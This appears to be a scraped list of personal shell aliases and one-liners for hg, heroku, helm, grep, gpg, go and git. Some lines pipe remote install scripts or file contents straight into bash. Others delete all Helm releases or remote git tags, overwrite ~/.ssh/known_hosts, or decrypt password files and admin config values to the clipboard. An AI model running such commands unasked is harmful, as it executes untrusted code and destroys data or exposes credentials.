hg diff --rev qparent -U1000000 -g | arc diff --raw --preview
hg diff --git | flake8 --diff
hg diff --color=always | less -R
hg diff --color=always | less
hg diff --color=always --git | less -r
hg diff --color always | less -R
hg brs | grep
hg branches | sort
hg branch | xclip -sel clip
hg -v log | less
hfiles | xargs grep $@
hexdump -C|cut -b 9-
hexdump -C | less -M -e
hexdump -C bin/a.img | less
hexdump -C < /dev/urandom | grep 'ca fe'
hexdump -C /dev/urandom | pv -q -L 2k
hexdump -C /dev/urandom | grep 'be ef'
hexdump -C $@ | less
heroku-config-to-env; heroku config:set \$(cat .env | sed '/^$/d; /#[[:print:]]*$/d')
heroku logs -n 300 --app $* | less
heroku logs --tail | grep
heroku logs --remote staging|less
heroku logs --remote production|less
heroku config:get SFUSD_OVERRIDE_PASSWORD -a edvnt-api | pbcopy
heroku config:get ADMIN_PASSWORD -a monolithium | pbcopy
heroku config | sed 's/: */=/g; /^=/d' >> .env.heroku
heroku config -r staging | grep -i
heroku config -r production | grep -i
hep_q | less
help test | less
helm template . | vim - \
helm template -f ./values.yaml . | kubectl delete -f -
helm template -f ./values.yaml . | kubectl create -f -
helm template -f ./values.yaml . | kubectl apply -f -
helm plugin list | awk
helm ls --all --short | xargs -Li helm delete --purge
head `ls -A1t | head -1`
head `ls -1t | head -1`
head < /dev/random | mutt -s \
head /dev/urandom | tr -dc 'A-Za-z0-9!
head /dev/urandom | shasum -a 512
head /dev/urandom | base64
head /dev/random | md5
head -v `ls -t|head -n2`
head -v `ls -t|head -n1`
head -n1 | awk '{print $2}'
head -n 3 | tail -n 1
head -n 2 | tail -n 1
head -n 1 ~/Documents/load_path.txt |pbcopy
head -n $l | tail -n 1
head -n $(( LINES - 2 err.txt generated.file succ.txt $(print ${PROMPT} |wc -l) ))
head -c6 /dev/urandom | xxd -ps
head -c512 /dev/random | sha512sum
head -c5 /dev/urandom | xxd -ps
head -c4 /dev/urandom | xxd -ps
head -c24 < /dev/random | base64
head -c16 /dev/urandom | xxd -ps
head -c-1 | > >(pbcopy) > >(cat) && echo
head -c 9 /dev/urandom | base64
head -c 500 /dev/urandom | md5sum
head -c 4 /dev/urandom | xxd -p -
head -c 30 /dev/urandom | base64
head -c 30 /dev/urandom | base32
head -c 24 /dev/urandom | base64
head -c 12 < /dev/urandom | base64
head -c 12 /dev/urandom | openssl enc -base64
head -c 1024 /dev/urandom | shasum -a 256
head -c -1|xclip -selection clipboard
head -c -1 | setclip
head -200 /etc/hosts | grep l99.com
head -2 ~/.ssh/known_hosts | tail -1 > ~/.ssh/known_hosts
head -2 | tail -1
head -1 | vl -
head -1 | kitty +kitten clipboard
head -1 readme.md | bash
head -1 /usr/local/apache/domlogs/$1|awk '{print $4}'
head -$((${RANDOM} % `wc -l < ~/.inspiration` + 1)) ~/.inspiration | tail -1
hd -C < /dev/urandom | grep 'ca fe'
hciconfig | grep hci0
ha|grep
haste | pbcopy
hash_blur | awk -v N=8 '{ sum += \$N } END { if (NR > 0) print sum }'
hash | grep
hash | awk -v N=8 '{ sum += \$N } END { if (NR > 0) print sum }'
hamster-cli list | xmessage -file -
h2st | awk
h |tail -n 15
h | sed 's/^[ ]*[0-9]\+[ ]*//'
h | grep \
h | grep -i
h | grep --color=auto
h | grep $(date +'%Y-%m-%d')
h | grep
h | g $1
h | g
h | ack -i
h 10000 | grep
h 1 | grep
h && hcmd 'mysql -u homestead < \`ls -t /vagrant/db/homestead_backup_*.sql | head -1\`'
gzip | wc -c
gzip | openssl enc -aes-256-cbc -a -salt
gzip -f | openssl enc -${CIPHER} -a
gzip -c $1 | wc -c
gzip -c $1 | base64 -w0
gzip -9 -c | openssl enc -a -A
gyazo | xclip -selection clipboard
gx | xargs mvim
gwdiff | lessr
gvw | grep -v '^Performing status on external item at'
gvs | head -1
gvim -S ~/Projects/sessions/$(pwd | xargs basename)
gvim --startuptime vim.log && cat vim.log | sort -k 2
gvim $HOME/bldlogs/`ls -1rt $HOME/bldlogs/ | tail -1`
gvim $(ls -ctr | tail -n-1)
gunzip < $1 | mysql -p $2
gunzip -c ../ramdisk.img | cpio -i
gulp | lolcat
gtl | gcount
gt-l | egrep
gt | cat
gt lg | grep Adam
gswdiff | lessr
gst-inspect-1.0 | grep sphinx
gst | perl -ne '\$done = 1 if m{Untracked \\s+ files:}xms; print unless \$done;'
gst | less
gst | grep -e 'new file' -e 'modified' -e 'deleted'
gst | fpp
gst | awk
gst -s | sed 's/\ [A-Z]\ //'
gsr | __filter_execute cd
gsr --all | __filter_execute cd
gsmu | gl
gsm | xargs -n1 touch
gsm | xargs -n1 git add
gsina | xargs git add
gsina | xargs -o git diff
gsina | xargs -o git add -p
gsina | git reset
gshuf /usr/share/dict/words | head -n 1
gshuf -n 1 ~/.frank | tr '[:lower:]' '[:upper:]'
gsha | clip.exe
gsettings list-recursively | less
gsettings list-recursively | grep gnome.Terminal
gsettings list-recursively | grep -i
gsettings list-recursively org.gnome.desktop.wm.keybindings | grep workspace
gsettings get org.gnome.desktop.background picture-uri | sed s/file://g
gselectwip | xargs git reset HEAD
gselectwip | xargs git checkout --
gselectwip | xargs git add
gsdiff | lessr
gs | less -S
gs | l
gs | grep \
gs | grep -e '^UU' --color=always
gs | grep -E \
gs | grep '?? '
gs | grep ' M '
gs | grep
gs | fpp -c subl
gs --porcelain | cut -c4-
grunt tasks | grep
grph | pbc
groff -man -Tascii \!* | less
grl | pbcopy
grip README.md --quiet --export - | browser
grimoire | peco --initial-matcher=Regexp
grep`echo | command grep -e '' --exclude-dir='*.svn' > /dev/null 2>&1 && echo ' '--exclude-dir=
grep_cmd . ~/.efffiles | grep_cmd -n -i `tail -1 ~/.eff.log`[^/]*$
grep_cmd . ~/.efffiles | grep_cmd -n -i `tail -1 ~/.eff.log`
grep ☆ /Users/shimizu/Documents/daily_log/daily_log_2014.org | tr ☆ -
grep webkit_revision $C/DEPS | head -n 1
grep time_secondsf ../results/(^*.bak*)#/**/STDOUT.0000 | tail -n 4
grep sts ~/.aws/config | awk
grep sshd.\*Failed /var/log/auth.log | less
grep sshd.*Did /var/log/auth.log | less
grep ssh /var/log/messages | tail
grep sigma OUTCAR | tail -1
grep sampled /opt/bid-router/logs/bid-router-trace.log | sort -n -k5
grep processor /proc/cpuinfo | wc -l
grep processor /proc/cpuinfo | wc
grep proc /proc/cpuinfo |wc -l
grep path .gitmodules | sed 's/.*= //'
grep password /Users/craigread/src/redbubble/config/deploy.rb | awk -F\\\
grep id-token ~/.kube/config | cut -d
grep diff | cut -d ' ' -f4
grep alias ~/.bashrc | nkf -w8
grep alias ~/.bashrc | less
grep ^bind ~/.config/i3/config | grep -v -e move -e workspace -e focus
grep ^alias ~/bashrc2.sh | less
grep ^alias ~/.bashrc | less
grep ^ERROR Testing/Temporary/LastTest.log | python ~/madlib-test-stdout-update.py
grep ^CONFIG /usr/src/hw1-sgoswami/.config | wc -l
grep \<ApplicationName\> SWTConfig.xml | sed 's/.*<ApplicationName>\([^<]*\)<\/ApplicationName>.*/\1/'
grep \<ApplicationInstance\> SWTConfig.xml | sed 's/.*<ApplicationInstance>\([^<]*\)<\/ApplicationInstance>.*/\1/'
grep \!* /etc/hosts | more
grep TOTEN OUTCAR | tail -1
grep Started | awk {
grep SiteInfoCacheDao /opt/bid-router/logs/bid-router.log | grep --color=auto exchangeId
grep ServerName | awk '{print $2}'
grep Pry -A 7 /Users/stefano/dev/S2M/test/test_helper.rb | pbcopy
grep PACMAN /var/log/pacman.log | less +G
grep Installed | grep x86_64
grep Installed | grep no_arch
grep Installed | grep i686
grep Estimated\ energy\ saved /var/log/syslog | tail -1
grep DROP /var/log/kern.log|less
grep DISTRIB_CODENAME /etc/upstream-release/lsb-release | grep -o --colour=never \
grep By **/*.[ch] | sed 's/^.*vlistrat.*$/OK/'
grep BASH_ALIASES .bash_aliases |grep -v aliases
grep Account ~/.aws/config | awk
grep AVC /var/log/audit/audit.log | audit2allow -R
grep : | sed s/:.*//
grep .BASHRC ~/.bashrc |grep -v alias
grep . ~/dotfiles/scripts/tips.txt | fzf
grep . ~/dotfiles/jap/* | fzf
grep . | grep -E -v '^[[:space:]]*#'
grep . | egrep -v '^[[:space:]]*#'
grep -vn '^$' ~/Documents/LBooks/Adam\ Smith\ Wealth\ of\ Nations.txt| shuf -n 1
grep -ve '^$' | grep -ve '^#'
grep -vE '^[[:blank:]]*(#|$)'
grep -v grep|grep --color=auto
grep -v grep|grep
grep -v grep | grep -i --color=always
grep -v grep | grep -i
grep -v grep | grep --color=auto
grep -v grep | grep --color -n -I --exclude='*.svn-*' --exclude='entries' --exclude='*/cache/*'
grep -v grep | grep --color
grep -v grep | grep
grep -v ^# |sed '/^$/d'
grep -v \# /etc/gitlab/gitlab.rb | grep port
grep -v \# /etc/gitlab/gitlab.rb | grep http
grep -v \# /etc/gitlab/gitlab.rb | grep /
grep -v -e '^.*\(DEBUG\|TRACE\).*'
grep -v -F -f <(git ls-remote --tags origin | cut -d / -f 3) <(git tag)
grep -v -E '^\s*$|^\s*#'
grep -v '^\s*(#|$)'
grep -v '^\s*$' | grep -v '^#'
grep -v '^[ ]*#\|^[ ]*$'
grep -v '^$\|^\s*\#'
grep -v '^$\|#'
grep -v '^#' /etc/group |
grep -v '\/\/\|\#'
grep -v '\(^#\|^\s*$\)'
grep -v '127.0.0.1' | awk '{print \$2}' && curl my-ip.heroku.com"
grep -v '127.0.0.1' | \
grep -v ""127.0.0.1"" | \
grep -rn --color=always $@[1] $@[2] | awk -F: '{print $1\
grep -rn '//TODO' | sed 's%\(^[^:]*:[^:]*\):.*//TODO. \(.*\)%\2 (\1)%'
grep -rl $1 . | xargs sed -i \
grep -ril . | grep -i
grep -re '\(#\|//\)\s*TODO'
grep -rLZE '.{500}' . | xargs -r0 grep --color=always -iPHn
grep -rE ^a: var/report/ | cut -d
grep -r -I 'TODO\|MAYBE'
grep -r '^\(CONTROL\|ENABLE\)_' /etc/laptop-mode/conf.d
grep -r 'TODO\|FIXME' .
grep -oE '[+-]?([0-9]*\.|[0-9]+\.?)[0-9]*([eE][-][0-9]+)?'
grep -o 'v-\S*' | paste -sd ' '
grep -o 'i-\S*' | paste -sd ' '
grep -o '^[^#]*' | grep -vF -e \
grep -o '^([[:alnum:]]+|[[:alnum:]]+\.[[:alpha:]]{1,3})' \
grep -o 'Current Rev:.*' | sed 's/Current Rev:[ ]*//'
grep -nwr TODO .; grep -nwr TODO . | wc
grep -nr ^bindsym ~/.i3/config | fzf
grep -n 'import ipdb;' -R . | grep -v '#'
grep -n ' Load (' $XRAS_ADMIN_ROOT/log/development_local.log |sort -b -k2
grep -m 1 -P -o $1 | head -n 1
grep -lr -color=none '<<<<<<<' . | xargs git checkout --theirs
grep -lr '<<<<<<<' app | xargs git checkout --theirs
grep -lr '<<<<<<<' app | xargs git checkout --ours
grep -lr '<<<<<<<' . | xargs git checkout
grep -l '\\documentclass' *tex | xargs latexmk -pdf -pvc -silent > /dev/null 2>&1 &
grep -l '\\documentclass' *tex | xargs latexmk -pdf -pvc -silent
grep -l '\\documentclass' *tex | xargs latexmk -pdf -pvc
grep -l $1 ./ | xargs perl -i -pe 's/$1/$2/g'
grep -ir --color=always $1 | sort
grep -e `date +%Y-%m-%d` /var/log/dpkg.log | awk
grep -e 'alias [a-zA-Z_-]*=.*' ~/.zshrc | bat
grep -e 'Safe \(front\|rear\) position.*$'
grep -cv ^#\|^$
grep -ch $1 $2 | awk '{ count += $0} END {print count}'
grep -Rin '# TODO\|// TODO' --exclude-dir=.venv --exclude-dir=node_modules --exclude-dir='vendors' --exclude-dir=misc --exclude-dir=dist .
grep -Ril '<<<<<<<\|>>>>>>>'
grep -Po 'gem\s+(\S+)' Gemfile | cut -d\
grep -P '^\d+\s' ~/.ietf/rfc-index.txt | fzf --preview='cat ~/.ietf/rfc{+1}.txt'
grep -P '^Host ([^*]+)$' $HOME/.ssh/config | sed 's/Host //'
grep -Ev '^\s*\t*($|#)'
grep -Ev '^($|\s*#)'
grep -Ev '^(#|$)'
grep -Ev '^$|^#' hosts
grep -Ev '^$|^#'
grep -Ev '^#|^$' hosts
grep -Ev '^#|^$'
grep -Ev '''^(#|$)'''
grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' |\
grep -Eo '^\w+:' makefile | sed 's/://'
grep -Eo '([0-9]*\.){3}[0-9]*' |\
grep -E -v '^(|[[:space:]]*#.*)$'
grep -E -o \\\(int\\\)[0-9]+$ | grep -E -o [0-9]+
grep -E --color 'warning:|^'
grep -E --color 'error:|^'
grep -E '^[[:space:]]*([[:alnum:]_]+[[:space:]]*\(\)|function[[:space:]]+[[:alnum:]_]+)'
grep -E 'Total force|!'
grep -E 'ERROR|Exception'
grep -A1 ALPM /var/log/pacman.log | less +G
grep --line-buffered --color=never -r '' err.txt generated.file succ.txt | fzf
grep --fixed-strings [gone] | \
grep --fixed-strings '[gone]' | \
grep --exclude-dir=coverage --exclude-dir=doc --exclude-dir=deps --exclude-dir=.git --exclude-dir=node_modules --recursive --ignore-case --extended-regex 'todo|fixme' .
grep --exclude-dir=.git -rEI 'TODO|FIXME' . 2>/dev/null
grep --exclude \$(echo ?????????? | cut -c-\$((\$RANDOM%10+1)))
grep --colour=always -nTP '(?<![\w\.])[-+]?[0-9]*[\.eE]?\-?[0-9]+|$'
grep --color=never -F '[PACMAN] Running' /var/log/pacman.log | less
grep --color -E ^|<string>
grep --color -E -e '^|' -e
grep 'inet addr' | \
grep '^x ....-..-..' /Users/jlintern/Dropbox/todo.txt/todo.txt | tee /tmp/archived_todos >> /Users/jlintern/Dropbox/todo.txt/done.txt; sed -i '' '/x ....-..-../d' /Users/jlintern/Dropbox/todo.txt/todo.txt; echo 'Archived the following items:'; cat /tmp/archived_todos
grep '^[#\s]*alias' ~/bashrc2.sh | less
grep '^[#\s]*alias' ~/.bashrc | less
grep '\[\(ERROR\|FATAL\)\]'
grep 'User ID' |
grep 'Loading test plan\|COMPLETED' testcases.out
grep 'Host ' ~/.ssh/config |cut -f2 -d ' '
grep '> \(ERROR\|WARNING\)' ~/typescript
grep '#PS1' ~/.bashrc | sed 's/^#\(.*\)/\1/'
grep ' T _' | sed 's/.* T _//'
grep ""inet addr"" | \
grep ""alias"" |
grc tail -f $XRAS_ADMIN_ROOT/log/development_local.log | perl -pi -e 's/(Processing by [a-zA-Z0-9]+sController#[a-z0-9_]+)/\007\033[31;1m\1 \033[0m/'
grc ps -aux | grep
grc ls -alFht | head
gradle assembleRelease && (cd build/outputs/apk/release && rr-apksign app-release && adb uninstall com.roblav96.highdpinavbarbuttonsfixed | true && adb install app-release-signed.apk && sleep 5 && adb shell \
gr | xargs -L1 git push
gpu; salita --update | tee ./pack_updated.log; npm dedupe; npm up -d; npm i ./ -d; npm up -d; npm-check
gpu; salita --update | tee ./pack_updated.log; npm dedupe; npm up -d; npm i ./ -d; npm dedupe; npm rebuild; npm-check -u
gprunelist | xargs git branch -d
gprune_list | xargs git branch -d
gprune_list | xargs git branch -D
gprune-list | xargs git branch -d
gprune-list | xargs git branch -D
gpr | grep
gphoto2 --stdout --capture-movie | ffmpeg -i - -vcodec rawvideo -pix_fmt yuv420p -threads 0 -f v4l2 /dev/video1
gpg2 --export-ssh-key $(gpg --card-status | sed '/^Authentication/!d;s/ //g;s/.*:[A-Z0-9]*\([A-Z0-9]\{16\}\)$/\1/')
gpg2 --decrypt $mybackup_restore | tar xfJ - -C $mybackup_restore_destination
gpg -r andries -d .gnupg/andries.gpg | grep -i
gpg -d ~/secret/pass.gpg | grep
gpg -d ~/gpg/bemo.gpg|more; sleep 30; clear
gpg -d ~/Squiz/svn/sysadmin/support-passwords.txt.gpg|less
gpg -d ~/Google\ Drive/Finance/Accounts/private.json.asc | less
gpg -d ~/Documents/diary/money/ledger.gpg | lreport -f -
gpg -d ~/Documents/diary/money/ledger.gpg | ledger -f -
gpg -d ~/.outlook-pass.gpg | less
gpg -d ~/.inbox-vpn.gpg | less
gpg -d ~/.Private_Docs/pss.new.asc.asc | less
gpg -d /usr/local/mt/pw/$LOGNAME.gpg | grep
gpg -d -q $LEDGER_FILE | ledger -f -
gpg -d -q $BINARY_HOME/binary-totp-ssh-key.asc | $OATHGEN_HOME/oathgen_linux_x86_64 -s stdin
gpg -d -q $BINARY_HOME/binary-last-pass.asc | $OATHGEN_HOME/oathgen_linux_x86_64 -s stdin
gpg -d --no-symkey-cache encrypted.txt.asc | less
gpg -d $PSYCPATH/pwstorage_db.xml.gpg | less
gpg -as | mail
gpg --with-colons --fast-list-mode --list-keys |
gpg --symmetric --cipher-algo aes256 | base64 --wrap=0
gpg --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3 7D2BAF1CF37B13E2069D6956105BD0E739499BDB && \curl -sSL https://get.rvm.io | bash -s stable --autolibs=homebrew --ignore-dotfiles --version latest
gpg --output - --export-secret-keys 0803154E > pubkey.gpg |
gpg --keyserver pgpkeys.mit.edu --recv-key $1 && gpg -a --export $1 | sudo apt-key add -
gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3;req https://get.rvm.io | bash -s stable;. $HOME/.bashrc
gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3 && \curl -sSL https://get.rvm.io | bash -s stable --ignore-dotfiles
gpg --help|$PAGER
gpg --export-ssh-key Robin | xclip
gpg --export -a|gpg --import
gpg --decrypt ~clake/private/passes.gpg | less
gpg --decrypt ~clake/.passes.gpg | less
gpg --decrypt ~/passwords.gpg | less
gpg --decrypt ~/encrypted/ubc.gpg | clipboard
gpg --decrypt ~/encrypted/pass.gpg | clipboard
gpg --decrypt ~/encrypted/master.gpg | clipboard
gpg --decrypt ~/encrypted/google.gpg | clipboard
gpg --decrypt ~/encrypted/generic.gpg | clipboard
gpg --decrypt ~/encrypted/ciena.gpg | clipboard
gpg --decrypt ~/encrypted/calsoft.gpg | clipboard
gpg --decrypt ~/.ssh/aws-dgit-ec2.rsa4096.password.gpg 2>/dev/null| pbcopy
gpg --decrypt $HOME/Dropbox/secrets/real_passwd_card.jpg.gpg | open -f -a Preview.app
gpg --decrypt $HOME/Dropbox/secrets/deutsche-bank-tan.jpg.gpg | open -f -a Preview.app
gpg --cipher-algo AES256 --symmetric | openssl enc -base64 -A
gpg --batch -q -d ~/.netrc.gpg | curl --netrc-file /dev/stdin
gpg --batch -d -q $LEDGER_FILE | ledger -f -
gpg --armor --export-secret-keys | gpg --armor --sign --symmetric --force-mdc
gpg --armor --export robbevanherck1@gmail.com | copy
gpg --armor --export m@brothier.org | xclip -sel clip
gpa | xargs open -a Mail.app
govendor list | grep ${1}
gource -1280x720 --max-files 0 --file-idle-time 0 --bloom-multiplier 0.5 --bloom-intensity 0.9 -e 0.7 --background 121212 -o - | ffmpeg -y -b 3000K -r 60 -f image2pipe -vcodec ppm -i - -vcodec libx264 -vpre slow -threads 0 gource.mp4
googler -j -w stackoverflow.com | xsel
google-chrome-stable --remote-debugging-port=4200 --user-data-dir=remote-profile &|
google-chrome &|
google-chrome $(nb-ip | awk -F ' ' '{print $2}'):8888
google-chrome $(knb-ip | awk -F ' ' '{print $2}'):8888/notebooks/user_data/notebooks
google-chrome $(fnb-ip | awk -F ' ' '{print $2}'):8888/
golisttypes | golistcleantogodoc
goliststructs | golistcleantogodoc
golistinterfaces | golistcleantogodoc
golint ./... | grep -v vendor
goland $(ghq root)/$(ghq list | peco)
gola | xargs go test
godoctypes | godoclistclean
godocstructs | godoclistclean
godocinterfaces | godoclistclean
godoc . | less
gocov test | gocov report
go-code-visualizer; cat dot-visual.gv | pbcopy; open -a \
go test \$(go list ./... | grep -v /vendor/) -tags=integration
go test ./... -json -cover | tparse -all -notests
go test -v | less
go test -v 2>&1 | golorize -conf=$HOME/.golorize/go-test.json
go test -v ./... | sed
go test -v ./... | grep -B 10 -A 10 FAIL
go test -v ./... -json | tparse -all
go test -v ./... -cover -tags=integration | grep FAIL
go test -v . | sed ''/PASS/s//$(printf
go test -v . | sed
go test -v -cover $(go list ./... | grep -v vendor)
go test -tags nondb ./... | grep -v \
go test -race -v -tags=integration $(go list ./... | grep -v
go test -race -tags=unit -v $(go list ./... | grep -v
go test -race -tags=unit $(go list ./... | grep -v
go test -race -tags=integration $(go list ./... | grep -v
go test $(go list ./... |grep -v integration_test)
go test $(go list ./... | grep -v /vendor/) -p 1
go test $(go list ./... | grep -v /vendor/)
go run -tags=debug main.go | lnav -q
go list ./... | grep -v vendor
go list -u -m -json all | go-mod-outdated -update -direct
go list -f '{{.Deps}}' | tr \
go install -race -v -a $(go list ./... | /bin/grep -v /vendor/) && go fmt ./...
go install -race -v $(go list ./... | /bin/grep -v /vendor/) && go fmt ./...
go build -o iptb main.go && yes | { cp -f iptb $GOPATH/bin && iptb init -n 2 --type docker } && iptb start
go build -o iptb main.go && yes | cp -f iptb $GOPATH/bin
go build $(go list ./... | grep -v vendor)
gnuls -al |more
gnome-terminal --window |
gnome-terminal --tab |
gnome-gpg -r andries -d .gnupg/andries.gpg | grep -i
gmylact | cut -d
gmyacts | head -1
gmod | spelunk
gmake x64Linux3gcc5.4.0malloc 2>&1 | colorize
gmake x64Linux3gcc5.4.0.extract 2>&1 | colorize
gmake x64Linux3gcc5.4.0 2>&1 | colorize
gmake generate 2>&1 | colorize
gm |xargs git reset HEAD
glxinfo | rg 'server glx vendor string'
glxinfo | grep 'OpenGL version'
glxinfo | egrep \
gltc | awk '{printf \
glt | awk '\$1=\
gls -tG --color|head
gls -lF ${colorflag} | grep '^d'
gls -l | more
gls -l --color | grep '^d'
gls -l ${colorflag} | grep ^d
gls -a | pbcopy
gls -RF| grep :
gls -F --color=tty | grep
gls --color=auto -lhF|grep -v /
gls --color=auto -alh|sort
gls --color=auto -alhF| less
gls --color=always --group-directories-first --classify -al | grep
gls --color -halFd */ ../ ./ | sed 's/.$//'
gls --color --group-directories-first --ignore='.|..'
glp --color-words --word-diff-regex='\\w+|.'
glong | cut -c 1-12
glong | cat
glon | cat
glola | grep
glogone | lessr
glogg | head
glog | lessr
glog | less -R
glog | lc-gradient-delay
glog | cat
glog `git reflog | cut -c1-7`
glog -n 1 | awk '{print \$2}'
glog -1 | cat
glog --author='\(Felix\)\|\(fehawen\)'
global-ip | xargs host
glo | yank
glo | wc -l
glo | head -n 5
glo | head -n 1
glo | head -10; true
glo | head
glo | grep -oP '(?<=tag: ).*(?=\))'
glo | cat
glo | ag TODO: --nocolor
gln | cat
gll | head -n 10
gll `git tag | tail -n 1`..HEAD
gll --color=always | head
glg | head
glg | cat
glg --decorate=short --pretty=format:'%Cblue%ad%Creset %C(yellow)%h%Creset%C(red)%d%Creset | %s [%C(green)%an%Creset]' --date=short
glf | head
glc | cat
glance image-list | grep
gl | head -n
gl | head -8
gl | head -50
gl | head -10
gl | head
gl | grep Luke
gl | grep $(date +%F)
gl | grep
gl | cat
gl | ag
gl -1 | pbcopy
gl --color=always | head
gitx --all `git reflog | cut -c1-7`
gitviper log | gvless
gitu | awk '{print \
gittoplevel |xargs open -a SourceTree
gitsha | pbcopy && pbpaste
gitree+ | head -n `expr $LINES / 2`
gitm | awk '{print \
gitlogfunc() { git log --format=%H -- $1 | head -n1}; gitlogfunc
gitlog | head
gitlc | sed -E 's/.*\[(.+)\].*/\1/g'
gitl | less
gitk --all \$( git fsck --no-reflog | awk '/dangling commit/ {print $3}' )
gitk --all --date-order &>/dev/null&|
gitk --all $|
gitk --all $( git fsck --no-reflog | awk
gitd | awk '{print \
gitb | awk '{print \
git_show_exclude_ruby_files | xargs rubocop
git_show_exclude_ruby_files | xargs -n1 -p rubocop --auto-correct
git_push=`git push |& grep set-upstream` && $git_push
git_list_gone | xargs git branch -d
git_list_gone | xargs git branch -D
git_checkout $(git branch | fzf)
git_checkout $(git branch -r | fzf)
git_changed_files | wc -l
git5 status | cut -d ' ' -f 4
git5 diff --uncommitted | diffstat
git/g' | \
git-worklist -s | clean-issues
git-unreachable | gitk --all --date-order
git-tag-latest-verbose; git-tag-latest | xargs -I @ git checkout tags/@ -b @
git-tag-latest-commit-id | xargs git log --oneline --decorate --no-walk
git-tag-latest-commit-id | xargs git describe --tags
git-summary | head -n 27
git-status-deleted | xargs git rm
git-short-sha | tcopy && git-short-sha
git-root && vi $(git status --porcelain | awk
git-recent-branches | head -20
git-modified-files-abs | relative
git-icdiff | less -R
git-gone | cut -d\
git-foresta | less -RSX
git-foresta --all --style=15 | less -RSX
git-foresta --all --style=10 | less -RSX
git-foresta --all --style=10 | less -RS
git-diff -E -b -w --no-color --unified=99999 $* | kompare -
git-current-branch | pbcopy
git-conflicts | xargs git add
git-conflicts | xargs $EDITOR
git-churn | tail -r -n 20
git-branch-by-date|head
git-allrepos -0 | xargs -0 -n1 -P10 -I\% bash -c '(cd %; git fetch --prune)'
git-allrepos -0 | xargs -0 -n1 -I\% bash -c '(cd %; echo %; git merge --ff-only; echo)'
git-activity --json --me | stream-json-clipboard -k message --humanize -p'- '
git vn --color=always | less -r
git verify-pack -v .git/objects/pack/pack-*.idx | sort -k3n
git van --color=always | less -r
git v --color=always | less -r
git tag|sort --reverse
git tag|less
git tag | xargs git tag -d && git fetch --tags
git tag | xargs git tag -d
git tag | xargs echo
git tag | xargs -n1 git tag -d && git fetch up --tags
git tag | xargs -n1 git tag -d && git fetch origin --tags
git tag | xargs -n1 git tag -d && git fetch --tags
git tag | xargs -I@ git log --format=format:\
git tag | tail -1
git tag | tail
git tag | sort -V
git tag | sort
git tag | perl -ne 'next unless /^\d+(\.\d+)+\$/; printf \
git tag | less -R -S
git tag | h -ni 2.2.3 2.2.4 2.2.5
git tag | gsort -V
git tag | grep error
git tag | grep err
git tag | grep
git tag | egrep -i
git tag | ack AF
git tag -n |sort -V
git tag -n | ruby -e \
git tag -n | gsort -V
git tag -ln | sort -V
git tag -l | xargs git tag -d;git fetch --tags
git tag -l | xargs git tag -d; git fetch
git tag -l | xargs git tag -d && git fetch -t
git tag -l | xargs git tag -d && git fetch --tags
git tag -l | xargs git tag -d && git fetch
git tag -l | xargs git tag -d
git tag -l | sort -V
git tag -l | less
git tag -l | gsort -V
git tag -l -n1 | sort -V
git tag -l -n1 | gsort -V
git tag -l --sort=v:refname | tail -n8
git tag -l --sort=v:refname | tail -1
git tag -l 'production/*' | tail -1
git tag -d $(git tag) && git fetch && git tag -l | xargs -n 1 git push --delete origin && git tag -d $(git tag)
git tag --sort=v:refname | tail -n1
git tag --sort=v:refname | tail -1
git tag --sort=-version:refname | head -1
git tag --sort=-version:refname | head -${1:-10}
git tag --sort=-v:refname | head -n 1
git tag --sort=-taggerdate | head -1
git tag --sort -v:refname | head -1
git tag --list | sort -r
git tag --list | sort -V
git tag --list | sort --version-sort
git tag --list | grep -i
git tag --list | cat
git symbolic-ref refs/remotes/origin/HEAD | sed 's@^refs/remotes/origin/@@'
git symbolic-ref head --short | pbcopy
git symbolic-ref HEAD|cut -d'/' -f3
git symbolic-ref HEAD | cut -d / -f 3
git symbolic-ref HEAD | cut -b 12-
git symbolic-ref HEAD 2>/dev/null | sed -e 's@refs/heads/@@'
git symbolic-ref HEAD 2>/dev/null | sed -e 's/refs\/heads\///'
git symbolic-ref HEAD 2>/dev/null | cut -d'/' -f 3
git symbolic-ref HEAD 2>/dev/null | cut -d
git symbolic-ref HEAD 2>/dev/null | cut -c12-
git symbolic-ref --short HEAD|tr -d \
git symbolic-ref --short HEAD| xargs git push origin
git symbolic-ref --short HEAD| xargs -Icurrent_branch git push heroku-st current_branch:master
git symbolic-ref --short HEAD | xargs git push origin
git symbolic-ref --short HEAD | xargs git push -uf origin
git symbolic-ref --short HEAD | xargs git push -u origin
git symbolic-ref --short HEAD | xargs git push --set-upstream origin
git symbolic-ref --short HEAD | xargs git pull origin --rebase
git symbolic-ref --short HEAD | xargs git pull origin
git symbolic-ref --short HEAD | tr -d
git symbolic-ref --short HEAD | pbcopy
git symbolic-ref --short HEAD 2> /dev/null | xargs -L1 git push origin
git symbolic-ref --short -q HEAD | xargs git push -u origin
git switch $(git branch | fzf)
git switch $(git --no-pager branch | peco)
git summary | less ${LESS_OPTS}
git submodule | grep $1
git submodule --quiet foreach git bran |sort -u
git st|less
git st|fpp
git status|less
git status|head -n2
git status|head -n 20
git status|head -23
git status|grep -v pom.xml
git status|grep
git status; git ls-files -v | grep \^h
git status; git log | head
git status; echo ''; git lsignore | sed -e 's/^h /Ignoring /'
git status |lolcat
git status |head
git status | vim -
git status | tee out && vi out
git status | sed -n 's/^.*both [a-z]*ed: *//p'
git status | sed '/\.html/d'
git status | sed '/Untracked/q'
git status | python ~/SkyDrive/repository/utility/git/git_untracked_delete.py
git status | python ~/SkyDrive/repository/utility/git/git_conflict_open.py
git status | perl6 -e
git status | perl -nlaF'\s+' -e'$F[1] eq \
git status | perl -ne '\$done = 1 if m{Untracked \\s+ files:}xms; print unless \$done;'
git status | more
git status | lv -c
git status | lolcat
git status | less; git diff --staged
git status | less -RXF
git status | less -REX
git status | less
git status | head -n20
git status | head -n 25
git status | head -n 20
git status | head -n 1
git status | head
git status | grep rej
git status | grep orig
git status | grep modified:
git status | grep modified
git status | grep \
git status | grep -v out/
git status | grep 'On branch'
git status | grep
git status | fpp -c git add
git status | fpp --no-file-checks
git status | fpp
git status | egrep (modified:)
git status | egrep 'modified'
git status | cowsay -n -f $(random_cow)
git status | cowsay -n
git status | cowsay -W80 -f $(random_cow)
git status | awk '{if($3 ~ /pyc$/){printf $3\
git status | awk '{if($3 ~ /pyc$/){printf $3
git status | awk '{if($2=\
git status | awk '/deleted/ {system(\
git status | awk
git status | amazeballs
git status | ag
git status | ${(z)GIT_PAGER}
git status ; echo ; git log --pretty=oneline --color=always | head
